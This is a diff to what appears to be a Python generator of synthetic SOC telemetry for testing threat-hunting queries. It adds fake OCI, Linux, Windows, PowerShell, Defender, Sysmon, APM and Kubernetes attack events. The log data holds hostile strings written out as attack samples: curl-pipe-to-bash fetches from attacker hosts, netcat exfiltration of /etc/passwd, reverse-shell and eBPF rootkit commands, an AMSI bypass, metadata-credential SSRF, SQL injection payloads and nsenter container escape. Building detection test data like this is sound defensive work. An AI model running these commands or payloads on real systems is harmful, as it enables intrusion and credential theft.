@@ -559,6 +559,57 @@ def generate_oci_audit_events():
             offset=1110+i
         ))
 
+    # ── Audit Configuration Retention Reduced (T1562.008 / T1070) ──
+    # Emit explicit retentionPeriodDays state-change so the hunting query
+    # "oci_audit_configuration_retention_reduced" matches against
+    # 'Original Log Content' like '*retentionPeriodDays*'. Principals reuse
+    # the existing OCI_USERS synthetic identity pool — no new OCID-shaped
+    # strings are introduced in this file.
+    from schemas import build_oci_audit_event as _build_audit
+
+    rogue_admin = OCI_USERS[3]        # rogue-admin@corp.example.com
+    compromised_svc = OCI_USERS[4]    # compromised-svc@corp.example.com
+    dev_ops_user = OCI_USERS[2]       # dev-ops@corp.example.com
+    retention_tenant_id = oci_audit_event(
+        "com.oraclecloud.audit.updateconfiguration", offset=1111
+    )["data"]["identity"]["tenantId"]  # reuse the synthetic tenant placeholder
+
+    retention_changes = [
+        (365, 30,  rogue_admin),
+        (365, 14,  compromised_svc),
+        (180, 7,   dev_ops_user),
+        (90,  1,   rogue_admin),
+    ]
+    for i, (prev_days, new_days, host_user) in enumerate(retention_changes):
+        ev = _build_audit(
+            "com.oraclecloud.audit.updateconfiguration",
+            event_time=ts(1112 + i),
+            principal_id=host_user[0],
+            principal_name=host_user[1],
+            auth_type=host_user[2],
+            ip_address=random.choice(SUSPICIOUS_IPS),
+            compartment_id=COMPARTMENT_ID,
+            compartment_name="security-test",
+            tenant_id=retention_tenant_id,
+            resource_name="audit-config",
+            request_parameters={"retentionPeriodDays": new_days, "isEnabled": True},
+            response_payload={"retentionPeriodDays": new_days, "isEnabled": True, "compartmentId": COMPARTMENT_ID},
+            state_previous={"retentionPeriodDays": prev_days, "isEnabled": True},
+            state_current={"retentionPeriodDays": new_days, "isEnabled": True},
+            response_status="200",
+        )
+        ev["oracle"] = {
+            "compartmentid": COMPARTMENT_ID,
+            "ingestedtime": ts(1112 + i),
+            "tenantid": retention_tenant_id,
+        }
+        ev["Status"] = "Success"
+        ev["Resource Name"] = "audit-config"
+        ev["Resource ID"] = ev.get("data", {}).get("resourceId", "")
+        # Surface raw JSON so 'Original Log Content' parser exposes retentionPeriodDays
+        ev["Original Log Content"] = json.dumps(ev.get("data", {}))
+        events.append(ev)
+
     # ── Network Firewall Policy Modified ──
     fw_events = [
         "com.oraclecloud.networkfirewall.updatenetworkfirewallpolicy",
@@ -1433,6 +1484,64 @@ def generate_linux_events():
     for i, (proc, cmd) in enumerate(persist_cmds):
         events.append(linux_event(proc, cmd, host=persist_host,
             offset=540+i, facility="syslog"))
+
+    # ═══════════════════════════════════════════════════════════════
+    #  Scenario expansion: hunting coverage for oci-coordinator demos
+    # ═══════════════════════════════════════════════════════════════
+
+    # ── Boopkit / eBPF Rootkit Activity (T1014, T1059.004, T1095) ──
+    boopkit_host = "k8s-worker-03"
+    boopkit_cmds = [
+        ("wget", "wget https://github.com/krisnova/boopkit/releases/download/v0.0.5/boopkit -O /tmp/boopkit"),
+        ("bash", "chmod +x /tmp/boopkit && /tmp/boopkit -i eth0 -p 4444"),
+        ("boopkit", "boopkit attaching eBPF program XDP_REDIRECT to interface eth0"),
+        ("bpftool", "bpftool prog load /tmp/boopkit.bpf.o /sys/fs/bpf/boopkit"),
+        ("bpftool", "bpftool map create /sys/fs/bpf/boopkit_map type hash key 8 value 64 entries 1024"),
+        ("bash", "ls /sys/fs/bpf/ -la"),
+        ("bash", "cat /sys/kernel/debug/tracing/trace_pipe | grep boopkit"),
+        ("bpftool", "bpftool prog show pinned /sys/fs/bpf/boopkit type xdp"),
+        ("boopkit", "boopkit triggered: magic packet from 185.220.101.1 invoked reverse shell to 198.51.100.77:4444"),
+        ("bash", "/tmp/boopkit --listen 0.0.0.0 --bpf-path /sys/fs/bpf/boopkit --magic deadbeef"),
+    ]
+    for i, (proc, cmd) in enumerate(boopkit_cmds):
+        events.append(linux_event(proc, cmd, host=boopkit_host,
+            offset=620+i, facility="syslog"))
+
+    # ── Web Server Process Spawning Shell (auditd ppid= style, T1059/T1190) ──
+    auditd_inject_host = "web-prod-01"
+    auditd_msgs = [
+        'type=SYSCALL msg=audit(1716200001.123:42): arch=c000003e syscall=59 success=yes ppid=python3 pid=21001 exe="/bin/bash" comm="bash" cmdline="bash -c id;whoami;cat /etc/passwd"',
+        'type=EXECVE msg=audit(1716200012.456:43): argc=3 a0="/bin/sh" a1="-c" a2="curl http://185.220.101.1/cmd | bash" ppid=node pid=21044 exe="/bin/sh"',
+        'type=SYSCALL msg=audit(1716200023.789:44): arch=c000003e syscall=59 success=yes ppid=java pid=21102 exe="/bin/bash" comm="bash" cmdline="bash -c \\"id && uname -a && cat /etc/shadow\\""',
+        'type=EXECVE msg=audit(1716200034.012:45): argc=3 a0="/bin/sh" a1="-c" a2="$(curl -s http://evil.com/payload.sh)" ppid=php pid=21155 exe="/bin/sh"',
+        'type=SYSCALL msg=audit(1716200045.234:46): ppid=nginx pid=21188 exe="/bin/bash" cmdline="bash -c \\"whoami; id; ls -la /etc/passwd\\""',
+        'type=EXECVE msg=audit(1716200056.567:47): argc=3 a0="/bin/dash" a1="-c" a2="cat /etc/passwd | nc 45.33.32.156 9999" ppid=uvicorn pid=21199 exe="/bin/dash"',
+        'type=SYSCALL msg=audit(1716200067.890:48): ppid=gunicorn pid=21220 exe="/usr/bin/bash" comm="bash" cmdline="bash -c \\"; whoami && id\\""',
+        'type=EXECVE msg=audit(1716200078.111:49): argc=3 a0="/bin/bash" a1="-c" a2="`cat /etc/passwd`" ppid=httpd pid=21250 exe="/bin/bash"',
+        'type=SYSCALL msg=audit(1716200089.333:50): ppid=ruby pid=21270 exe="/bin/sh" cmdline="sh -c \\"id; cat /etc/shadow\\""',
+    ]
+    for i, m in enumerate(auditd_msgs):
+        events.append(linux_event("auditd", m, host=auditd_inject_host,
+            offset=640+i, facility="syslog"))
+
+    # ── SSRF to Cloud Instance Metadata Service from Web Process (T1552.005, T1190) ──
+    ssrf_host = "app-prod-02"
+    ssrf_cmds = [
+        ("python3", "python3 -c \"import requests; print(requests.get('http://169.254.169.254/opc/v2/instance/').text)\""),
+        ("curl", "curl -s http://169.254.169.254/opc/v2/instance/metadata/identity/cert.pem"),
+        ("node", "node -e \"require('http').get('http://169.254.169.254/opc/v2/identity/', r=>r.pipe(process.stdout))\""),
+        ("uvicorn", 'uvicorn worker: GET /api/fetch?url=http://169.254.169.254/opc/v2/instance/ HTTP/1.1 200'),
+        ("wget", "wget -qO- http://169.254.169.254/opc/v2/instance/metadata/credentials/oci_user_principal_session"),
+        ("java", "java -cp app.jar com.evil.MetadataDump http://169.254.169.254/opc/v2/instance/"),
+        ("gunicorn", 'gunicorn[21389]: GET /api/proxy?u=http%3A%2F%2F169.254.169.254%2Fopc%2Fv2%2Finstance%2F HTTP/1.1 200'),
+        ("php", "php -r \"echo file_get_contents('http://169.254.169.254/opc/v2/instance/');\""),
+        ("ruby", "ruby -e \"require 'net/http'; puts Net::HTTP.get('169.254.169.254','/opc/v2/instance/')\""),
+        ("httpd", 'httpd[21422]: GET /image-proxy?url=http://169.254.169.254/opc/v2/identity/cert.pem HTTP/1.1 200'),
+        ("nginx", 'nginx: GET /api/v1/preview?src=http://169.254.169.254/opc/v2/instance/ HTTP/1.1 200'),
+    ]
+    for i, (proc, cmd) in enumerate(ssrf_cmds):
+        events.append(linux_event(proc, cmd, host=ssrf_host,
+            offset=660+i, facility="syslog"))
 
     return events
 
@@ -2774,7 +2883,7 @@ SEVEN_KINGDOMS_LINUX = [
 
 def winsec_event(event_id, user=None, host=None, source_addr=None,
                  logon_type=None, process_name=None, command_line=None,
-                 msg=None, offset=0):
+                 msg=None, offset=0, extra=None):
     """Generate a Windows Security Event Log JSON entry via the canonical builder.
 
     Delegates to ``schemas.build_windows_security_event`` so the record matches
@@ -2804,6 +2913,7 @@ def winsec_event(event_id, user=None, host=None, source_addr=None,
         process_name=process_name or "",
         new_process_name=process_name or "",
         command_line=command_line or "",
+        extra=extra,
     )
     event["msg"] = msg or f"Windows Security Event {event_id}"
     # Legacy compatibility: existing detection queries expect these alias
@@ -2819,7 +2929,68 @@ def winsec_event(event_id, user=None, host=None, source_addr=None,
     event.setdefault("LogonType", str(logon_type) if logon_type else "")
     event.setdefault("SourceAddress", source_addr)
     event.setdefault("Entity", host)
+    add_windows_event_envelope(
+        event,
+        channel="Security",
+        provider="Microsoft-Windows-Security-Auditing",
+        provider_guid="{54849625-5478-4994-A5BA-3E3B0328C30D}",
+        event_data_fields=[
+            "SubjectUserName", "TargetUserName", "TargetDomainName",
+            "SourceAddress", "LogonType", "ProcessName", "NewProcessName",
+            "CommandLine", "ObjectName", "ObjectType", "ObjectServer",
+            "AccessMask", "FailureReason", "Status", "SubStatus",
+            "TaskName", "ShareName", "RelativeTargetName", "ServiceName",
+            "ServiceFileName", "Properties", "PrivilegeList",
+        ],
+    )
     return event
+
+
+def add_windows_event_envelope(event, *, channel, provider, provider_guid="",
+                               event_data_fields=None):
+    """Attach a Windows Event XML-shaped envelope translated to JSON.
+
+    The envelope mirrors the official ``Event/System/EventData`` structure while
+    preserving the top-level parser aliases used by the OCI Log Analytics JSON
+    parsers.
+    """
+    event_id = str(event.get("EventID") or event.get("Event ID") or "")
+    event_time = event.get("TimeCreated") or event.get("UtcTime") or event.get("time") or ts(0)
+    computer = event.get("Computer") or event.get("Host Name (Server)") or event.get("Host Name") or "windows.synthetic.example"
+    provider_entry = {"Name": provider}
+    if provider_guid:
+        provider_entry["Guid"] = provider_guid
+
+    fields = event_data_fields or []
+    event_data = [
+        {"Name": field, "#text": str(event[field])}
+        for field in fields
+        if event.get(field) not in ("", None)
+    ]
+
+    event["Event"] = {
+        "System": {
+            "Provider": provider_entry,
+            "EventID": event_id,
+            "Version": "0",
+            "Level": "0",
+            "Task": "0",
+            "Opcode": "0",
+            "Keywords": "0x8020000000000000",
+            "TimeCreated": {"SystemTime": event_time},
+            "EventRecordID": str(event.get("Event Record ID") or event.get("EventRecordID") or random.randint(1000, 999999)),
+            "Correlation": {},
+            "Execution": {
+                "ProcessID": str(event.get("Process ID") or event.get("ProcessId") or 704),
+                "ThreadID": str(event.get("ThreadID") or 1140),
+            },
+            "Channel": channel,
+            "Computer": computer,
+            "Security": {"UserID": "S-1-5-18"},
+        },
+        "EventData": {"Data": event_data},
+    }
+    event.setdefault("RenderedDescription", event.get("msg", ""))
 
 
 def _generate_windows_ad_attack_events():
@@ -3037,7 +3208,26 @@ def generate_windows_event_security():
         events.append(winsec_event(
             4698, user=random.choice(THREAT_ACTORS),
             msg="A scheduled task was created.",
+            extra={
+                "TaskName": "\\Microsoft\\Windows\\Update\\CacheTask",
+                "Task Name": "\\Microsoft\\Windows\\Update\\CacheTask",
+                "CommandLine": "C:\\Windows\\Temp\\cache_update.exe",
+                "Command Line": "C:\\Windows\\Temp\\cache_update.exe",
+            },
             offset=310+i,
+        ))
+    for i in range(3):
+        events.append(winsec_event(
+            4702,
+            user=random.choice(THREAT_ACTORS),
+            msg="A scheduled task was updated.",
+            extra={
+                "TaskName": "\\Microsoft\\Windows\\WDI\\DiagnosticTask",
+                "Task Name": "\\Microsoft\\Windows\\WDI\\DiagnosticTask",
+                "CommandLine": "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\Public\\stage.ps1",
+                "Command Line": "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\Public\\stage.ps1",
+            },
+            offset=314+i,
         ))
 
     # ── Event 4728/4732/4756: Group Membership Changes ──
@@ -3050,7 +3240,13 @@ def generate_windows_event_security():
         for i in range(3):
             events.append(winsec_event(
                 eid, user=random.choice(THREAT_ACTORS),
-                msg=msg_text, offset=320+idx*5+i,
+                msg=f"{msg_text} Group Name: Domain Admins",
+                extra={
+                    "TargetUserName": "Domain Admins",
+                    "Target User Name": "Domain Admins",
+                    "MemberName": "CN=sql_svc,CN=Users,DC=sevenkingdoms,DC=local",
+                },
+                offset=320+idx*5+i,
             ))
 
     # ── Event 1102: Audit Log Cleared ──
@@ -3059,6 +3255,14 @@ def generate_windows_event_security():
             1102, user=random.choice(THREAT_ACTORS),
             msg="The audit log was cleared.",
             offset=400+i,
+        ))
+    for i in range(3):
+        events.append(winsec_event(
+            4719,
+            user=random.choice(THREAT_ACTORS),
+            msg="System audit policy was changed. Audit Policy Change: Success removed for Object Access.",
+            extra={"Status": "Success", "SubStatus": "", "Category": "Object Access"},
+            offset=410+i,
         ))
 
     # ── Event 4688: Process Creation ──
@@ -3170,7 +3374,95 @@ def generate_windows_event_security():
         events.append(winsec_event(
             4663, user=random.choice(THREAT_ACTORS),
             msg="An attempt was made to access an object.",
+            extra={
+                "ObjectName": "E:\\Finance\\payroll-export.xlsx",
+                "Object Name": "E:\\Finance\\payroll-export.xlsx",
+                "AccessMask": "0x2",
+                "Access Mask": "0x2",
+            },
             offset=710+i,
+        ))
+
+    # Native account-logon failure telemetry: Kerberos pre-auth and NTLM validation.
+    for i, status in enumerate(["0x18", "0x6", "0x25", "0x18", "0x18"]):
+        events.append(winsec_event(
+            4771,
+            user="sql_svc",
+            source_addr=random.choice(SUSPICIOUS_IPS),
+            msg=f"Kerberos pre-authentication failed. Failure Code: {status}",
+            extra={
+                "TargetUserName": "sql_svc",
+                "Target User Name": "sql_svc",
+                "Status": status,
+                "FailureReason": status,
+                "Failure Reason": status,
+            },
+            offset=730+i,
+        ))
+    for i, status in enumerate(["0xC000006A", "0xC000006D", "0xC0000234", "0xC000006A"]):
+        events.append(winsec_event(
+            4776,
+            user="backup_svc",
+            source_addr=random.choice(SUSPICIOUS_IPS),
+            msg=f"The computer attempted to validate the credentials for an account. Error Code: {status}",
+            extra={
+                "TargetUserName": "backup_svc",
+                "Target User Name": "backup_svc",
+                "Status": status,
+                "FailureReason": status,
+                "Failure Reason": status,
+            },
+            offset=740+i,
+        ))
+
+    # Native file share access telemetry, including admin shares and detailed file share checks.
+    share_events = [
+        (5140, "\\\\*\\C$", ""),
+        (5140, "\\\\*\\ADMIN$", ""),
+        (5145, "\\\\*\\C$", "Windows\\Temp\\payload.exe"),
+        (5145, "\\\\*\\Finance", "Payroll\\payroll-export.xlsx"),
+    ]
+    for i, (event_id, share_name, relative_target) in enumerate(share_events):
+        events.append(winsec_event(
+            event_id,
+            user=random.choice(THREAT_ACTORS),
+            source_addr=random.choice(SUSPICIOUS_IPS),
+            msg=f"A network share object was {'accessed' if event_id == 5140 else 'checked'}. Share Name: {share_name}",
+            extra={
+                "ShareName": share_name,
+                "Share Name": share_name,
+                "RelativeTargetName": relative_target,
+                "Relative Target Name": relative_target,
+                "AccessMask": "0x12019f",
+                "Access Mask": "0x12019f",
+            },
+            offset=750+i,
+        ))
+
+    # Native service installation telemetry in the Security log.
+    events.append(winsec_event(
+        4697,
+        user="robb",
+        host="SRV01.sevenkingdoms.local",
+        msg="A service was installed in the system.",
+        extra={
+            "ServiceName": "WindowsUpdateCache",
+            "Service Name": "WindowsUpdateCache",
+            "ServiceFileName": "C:\\Windows\\Temp\\wucache.exe",
+            "Service File Name": "C:\\Windows\\Temp\\wucache.exe",
+        },
+        offset=760,
+    ))
+
+    # Account and group enumeration events noted in the incident-response guide.
+    for i, event_id in enumerate([4798, 4799, 4798, 4799, 4799]):
+        events.append(winsec_event(
+            event_id,
+            user="arya",
+            source_addr=random.choice(SUSPICIOUS_IPS),
+            msg="A local account or security-enabled local group membership was enumerated.",
+            extra={"TargetUserName": "administrator", "Target User Name": "administrator"},
+            offset=770+i,
         ))
 
     events.extend(_generate_windows_ad_attack_events())
@@ -3178,7 +3470,7 @@ def generate_windows_event_security():
     return events
 
 
-def winsys_event(event_id, host=None, service_name=None, user=None,
+def winsys_event(event_id, host=None, service_name=None, service_file_name=None, user=None,
                  msg=None, offset=0):
     """Generate a Windows System Event Log JSON entry.
 
@@ -3188,11 +3480,14 @@ def winsys_event(event_id, host=None, service_name=None, user=None,
         host = random.choice(SEVEN_KINGDOMS_HOSTS)
     if user is None:
         user = random.choice(["SYSTEM", "LOCAL SERVICE"] + THREAT_ACTORS)
-    return {
+    event = {
         # OCI Log Analytics mapped fields
         "Event ID": int(event_id),
         "Host Name (Server)": host,
+        "Host Name": host,
+        "Entity": host,
         "Service Name": service_name or "",
+        "Service File Name": service_file_name or "",
         # Native fields
         "EventID": str(event_id),
         "TimeCreated": ts(offset),
@@ -3200,9 +3495,17 @@ def winsys_event(event_id, host=None, service_name=None, user=None,
         "Channel": "System",
         "Provider": "Service Control Manager",
         "ServiceName": service_name or "",
+        "ServiceFileName": service_file_name or "",
         "User": user,
         "msg": msg or f"Windows System Event {event_id}",
     }
+    add_windows_event_envelope(
+        event,
+        channel="System",
+        provider="Service Control Manager",
+        event_data_fields=["ServiceName", "ServiceFileName", "User"],
+    )
+    return event
 
 
 def generate_windows_event_system():
@@ -3222,6 +3525,7 @@ def generate_windows_event_system():
             events.append(winsys_event(
                 7045,
                 service_name=svc_name,
+                service_file_name=svc_path,
                 user=random.choice(THREAT_ACTORS + ["SYSTEM"]),
                 msg=f"A service was installed in the system. Service Name: {svc_name} Service File Name: {svc_path}",
                 offset=i*5+j,
@@ -3237,6 +3541,143 @@ def generate_windows_event_system():
         ))
 
     return events
+
+
+def winps_event(event_id, host=None, user=None, script_block=None,
+                command_line=None, host_application=None, process_name=None,
+                msg=None, offset=0):
+    """Generate a Windows PowerShell Operational JSON entry."""
+    if host is None:
+        host = random.choice(SEVEN_KINGDOMS_HOSTS)
+    if user is None:
+        user = random.choice(THREAT_ACTORS)
+    process = process_name or r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+    command = command_line or "powershell.exe -NoProfile"
+    event = {
+        "Log Source": "Windows PowerShell Operational Logs",
+        "Event ID": int(event_id),
+        "Host Name (Server)": host,
+        "Host Name": host,
+        "User": user,
+        "EventID": str(event_id),
+        "TimeCreated": ts(offset),
+        "Computer": host,
+        "Channel": "Microsoft-Windows-PowerShell/Operational",
+        "Provider": "Microsoft-Windows-PowerShell",
+        "ScriptBlockText": script_block or "",
+        "Script Block Text": script_block or "",
+        "CommandLine": command,
+        "Command Line": command,
+        "HostApplication": host_application or command,
+        "Host Application": host_application or command,
+        "ProcessName": process,
+        "Process Name": process,
+        "msg": msg or f"Windows PowerShell Operational Event {event_id}",
+    }
+    add_windows_event_envelope(
+        event,
+        channel="Microsoft-Windows-PowerShell/Operational",
+        provider="Microsoft-Windows-PowerShell",
+        provider_guid="{A0C1853B-5C40-4B15-8766-3CF1C58F985A}",
+        event_data_fields=[
+            "ScriptBlockText", "CommandLine", "HostApplication",
+            "ProcessName",
+        ],
+    )
+    return event
+
+
+def generate_windows_powershell_operational():
+    """Generate PowerShell operational events for script block detections."""
+    events = []
+    suspicious_blocks = [
+        "IEX(New-Object Net.WebClient).DownloadString('https://example.invalid/stage.ps1')",
+        "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
+        "$bytes=[Convert]::FromBase64String('SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsA'); IEX([Text.Encoding]::Unicode.GetString($bytes))",
+        "Invoke-Expression (Get-Content C:\\Users\\Public\\stage.ps1 -Raw)",
+    ]
+    for i, script_block in enumerate(suspicious_blocks):
+        events.append(winps_event(
+            4104,
+            user=random.choice(THREAT_ACTORS),
+            script_block=script_block,
+            command_line="powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden",
+            msg="Creating Scriptblock text with suspicious content.",
+            offset=800+i,
+        ))
+    events.append(winps_event(
+        4103,
+        user="sansa",
+        script_block="Get-ADUser -Filter * -Properties *",
+        command_line="powershell.exe -NoProfile -Command Get-ADUser -Filter * -Properties *",
+        msg="PowerShell pipeline execution details.",
+        offset=810,
+    ))
+    return events
+
+
+def windef_event(event_id, host=None, user=None, threat_name=None, action=None,
+                 status=None, severity=None, file_path=None, msg=None, offset=0):
+    """Generate a Windows Defender Operational JSON entry."""
+    if host is None:
+        host = random.choice(SEVEN_KINGDOMS_HOSTS)
+    if user is None:
+        user = "SYSTEM"
+    threat = threat_name or "Trojan:Win32/Example"
+    path = file_path or r"C:\Users\Public\stage.exe"
+    event = {
+        "Log Source": "Windows Defender Operational Logs",
+        "Event ID": int(event_id),
+        "Host Name (Server)": host,
+        "Host Name": host,
+        "User": user,
+        "EventID": str(event_id),
+        "TimeCreated": ts(offset),
+        "Computer": host,
+        "Channel": "Microsoft-Windows-Windows Defender/Operational",
+        "Provider": "Microsoft-Windows-Windows Defender",
+        "ThreatName": threat,
+        "Threat Name": threat,
+        "ThreatID": "2147712345",
+        "Threat ID": "2147712345",
+        "Action": action or "",
+        "Status": status or "",
+        "Severity": severity or "High",
+        "DetectionSource": "Real-Time Protection",
+        "Detection Source": "Real-Time Protection",
+        "FilePath": path,
+        "File Path": path,
+        "msg": msg or f"Microsoft Defender Operational Event {event_id}",
+    }
+    add_windows_event_envelope(
+        event,
+        channel="Microsoft-Windows-Windows Defender/Operational",
+        provider="Microsoft-Windows-Windows Defender",
+        event_data_fields=[
+            "ThreatName", "ThreatID", "Action", "Status", "Severity",
+            "DetectionSource", "FilePath",
+        ],
+    )
+    return event
+
+
+def generate_windows_defender_operational():
+    """Generate Microsoft Defender operational events for malware and tamper detections."""
+    return [
+        windef_event(1116, action="Detected", status="Active", msg="Microsoft Defender Antivirus detected malware.", offset=820),
+        windef_event(1117, action="Quarantined", status="Remediated", msg="Microsoft Defender Antivirus took action on malware.", offset=821),
+        windef_event(1118, action="RemediationFailed", status="Failed", msg="Microsoft Defender Antivirus remediation failed.", offset=822),
+        windef_event(
+            5007,
+            threat_name="Defender Configuration Change",
+            action="ConfigurationChanged",
+            status="Changed",
+            severity="Medium",
+            file_path=r"HKLM\SOFTWARE\Microsoft\Windows Defender",
+            msg="Microsoft Defender Antivirus configuration has changed.",
+            offset=823,
+        ),
+    ]
 
 
 def linux_secure_event(process, message, host=None, user=None,
@@ -3630,6 +4071,19 @@ def sysmon_op_event(event_id, host=None, user=None, source_image=None,
     event["CommandLine"] = command_line or ""
     event["GrantedAccess"] = granted_access or ""
     event["msg"] = msg or f"Sysmon Event {event_id}"
+    add_windows_event_envelope(
+        event,
+        channel="Microsoft-Windows-Sysmon/Operational",
+        provider="Microsoft-Windows-Sysmon",
+        provider_guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+        event_data_fields=[
+            "UtcTime", "Image", "SourceImage", "TargetImage", "CommandLine",
+            "ParentImage", "ParentCommandLine", "DestinationHostname",
+            "DestinationIp", "DestinationPort", "QueryName", "QueryResults",
+            "PipeName", "TargetFilename", "TargetObject", "GrantedAccess",
+            "Hashes",
+        ],
+    )
     return event
 
 
@@ -3966,6 +4420,22 @@ def generate_sysmon_operational():
             user=random.choice(THREAT_ACTORS),
             msg=f"File created: payload_{i}.exe",
             offset=520+i,
+        ))
+
+    # ── Event 29: FileExecutableDetected (Sysmon 15+) ──
+    executable_drops = [
+        "C:\\Users\\Public\\Downloads\\invoice_viewer.exe",
+        "C:\\Windows\\Temp\\wucache.exe",
+        "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\updater.exe",
+    ]
+    for i, fname in enumerate(executable_drops):
+        events.append(sysmon_op_event(
+            29,
+            source_image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            target_filename=fname,
+            user=random.choice(THREAT_ACTORS),
+            msg=f"File executable detected: {fname.split(chr(92))[-1]}",
+            offset=526+i,
         ))
 
     # BLUELIGHT-style periodic screenshot staging.
@@ -6605,6 +7075,346 @@ def generate_application_events():
         ),
     ])
 
+    # ═══════════════════════════════════════════════════════════════
+    #  APM SQL Injection Attack in Request (T1190) — SOC Application Logs
+    # ═══════════════════════════════════════════════════════════════
+    apm_sqli_payloads = [
+        ("enterprise-crm-portal", "/crm/api/customers?search=1' OR 1=1--", "401", 41),
+        ("enterprise-crm-portal", "/crm/api/customers?search=' OR '1'='1", "401", 45),
+        ("enterprise-crm-portal", "/crm/api/orders?status=pending' UNION SELECT username,password,1,2,3,4,5 FROM users--", "500", 320),
+        ("octo-drone-shop", "/shop/api/products?cat=1 UNION%20SELECT%20password,email%20FROM%20customers--", "500", 280),
+        ("octo-drone-shop", "/shop/api/products?id=2'%20OR%201%3D1--", "200", 95),
+        ("enterprise-crm-portal", "/crm/api/reports?id=1' AND SLEEP(5)--", "504", 5050),
+        ("enterprise-crm-portal", "/crm/api/reports?id=1' OR (SELECT COUNT(*) FROM users)>0--", "200", 130),
+        ("octo-drone-shop", "/shop/search?q=' UNION SELECT NULL,table_name FROM INFORMATION_SCHEMA.TABLES--", "500", 410),
+        ("enterprise-crm-portal", "/crm/login?user=admin'--&pass=anything", "302", 80),
+        ("octo-drone-shop", "/shop/api/orders?ref=1; DROP TABLE sessions", "500", 65),
+        ("enterprise-crm-portal", "/crm/api/customers?filter=' OR 1=1 LIMIT 1 OFFSET 0--", "200", 110),
+        ("octo-drone-shop", "/shop/api/products?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--", "500", 240),
+    ]
+    for i, (svc, url, status, latency) in enumerate(apm_sqli_payloads):
+        events.append(application_event(
+            svc,
+            message="SQL injection attack detected in request",
+            level="WARN" if status.startswith("2") else "ERROR",
+            url=url,
+            http_method="GET",
+            status_code=status,
+            response_time_ms=latency,
+            client_ip=random.choice(SUSPICIOUS_IPS),
+            user_agent=random.choice(["sqlmap/1.7", "Mozilla/5.0 (compatible; Nuclei)", "Mozilla/5.0 (X11; Linux x86_64)"]),
+            attack_type="sql_injection",
+            attack_severity="critical",
+            waf_score=92 + (i % 8),
+            span_attributes=f"attack.type=sql_injection mitre.technique=T1190 owasp.category=A03_Injection attack.payload_len={len(url)}",
+            workflow_id="threat-detection",
+            workflow_step="apm-sqli",
+            trace_id=f"trace_apm_sqli_{i:02d}",
+            offset=150 + i,
+        ))
+
+    events.extend(generate_oke_kubernetes_attack_events())
+
+    return events
+
+
+def generate_oke_kubernetes_attack_events():
+    """Generate OKE/Kubernetes attack telemetry in the SOC Application/APM schema."""
+    attack_trace = "trace_oke_boopkit_attack_001"
+    attack_id = "attack-oke-boopkit-001"
+    run_id = "run-oke-k8s-attacks-001"
+    request_id = "req_oke_boopkit_001"
+    actor_ip = "198.51.100.88"
+    stages = [
+        {
+            "stage": "api_recon",
+            "message": "OKE API discovery requested cluster resources with kubectl",
+            "severity": "medium",
+            "technique_id": "T1613",
+            "technique": "Container and Resource Discovery",
+            "url": "/apis/apps/v1/namespaces/prod/deployments",
+            "method": "GET",
+            "status": "200",
+            "span": "span_oke_boopkit_api_recon",
+            "parent": "",
+            "host": "oke-api-server",
+            "workflow_step": "api-recon",
+            "command": "kubectl get pods,secrets,daemonsets -A",
+            "attributes": "k8s.audit.verb=list k8s.resource=pods,secrets userAgent=kubectl",
+        },
+        {
+            "stage": "secret_collection",
+            "message": "Service account token and registry secret read from production namespace",
+            "severity": "high",
+            "technique_id": "T1552.007",
+            "technique": "Container and Cloud Credential Discovery",
+            "url": "/api/v1/namespaces/prod/secrets/prod-registry-token",
+            "method": "GET",
+            "status": "200",
+            "span": "span_oke_boopkit_secret_read",
+            "parent": "span_oke_boopkit_api_recon",
+            "host": "oke-api-server",
+            "workflow_step": "secret-collection",
+            "command": "kubectl get secret prod-registry-token -n prod -o yaml",
+            "attributes": "k8s.audit.verb=get k8s.resource=secrets k8s.namespace=prod",
+        },
+        {
+            "stage": "privileged_daemonset",
+            "message": "Privileged DaemonSet created with hostPID and hostPath mounts",
+            "severity": "critical",
+            "technique_id": "T1611",
+            "technique": "Escape to Host",
+            "url": "/apis/apps/v1/namespaces/kube-system/daemonsets/node-diag-agent",
+            "method": "POST",
+            "status": "201",
+            "span": "span_oke_boopkit_privileged_daemonset",
+            "parent": "span_oke_boopkit_secret_read",
+            "host": "oke-api-server",
+            "workflow_step": "privileged-workload",
+            "command": "kubectl apply -f daemonset-hostpid-hostpath.yaml",
+            "attributes": "k8s.audit.verb=create k8s.resource=daemonsets privileged=true hostPID=true hostPath=/proc,/sys,/var/run",
+        },
+        {
+            "stage": "node_exec",
+            "message": "Interactive exec opened into privileged OKE node diagnostic pod",
+            "severity": "high",
+            "technique_id": "T1609",
+            "technique": "Container Administration Command",
+            "url": "/api/v1/namespaces/kube-system/pods/node-diag-agent-8fk2p/exec",
+            "method": "POST",
+            "status": "101",
+            "span": "span_oke_boopkit_pod_exec",
+            "parent": "span_oke_boopkit_privileged_daemonset",
+            "host": "oke-worker-01",
+            "workflow_step": "pod-exec",
+            "command": "kubectl exec -n kube-system node-diag-agent-8fk2p -- nsenter -t 1 -m -u -i -n sh",
+            "attributes": "k8s.audit.verb=create subresource=exec container=node-diag-agent nsenter host namespace",
+        },
+        {
+            "stage": "boopkit_ebpf_load",
+            "message": "Boopkit-style eBPF program load observed from privileged container",
+            "severity": "critical",
+            "technique_id": "T1014",
+            "technique": "Rootkit",
+            "url": "/proc/sys/kernel/bpf",
+            "method": "POST",
+            "status": "500",
+            "span": "span_oke_boopkit_ebpf_load",
+            "parent": "span_oke_boopkit_pod_exec",
+            "host": "oke-worker-01",
+            "workflow_step": "ebpf-rootkit",
+            "command": "bpftool prog load boopkit_kern.o /sys/fs/bpf/boopkit type kprobe",
+            "attributes": "boopkit ebpf rootkit bpftool kprobe /sys/fs/bpf traffic-hiding",
+        },
+        {
+            "stage": "boopkit_c2_hide",
+            "message": "Boopkit eBPF rootkit hid reverse shell and C2 listener traffic",
+            "severity": "critical",
+            "technique_id": "T1105",
+            "technique": "Ingress Tool Transfer",
+            "url": "/run/boopkit/c2",
+            "method": "POST",
+            "status": "503",
+            "span": "span_oke_boopkit_c2_hide",
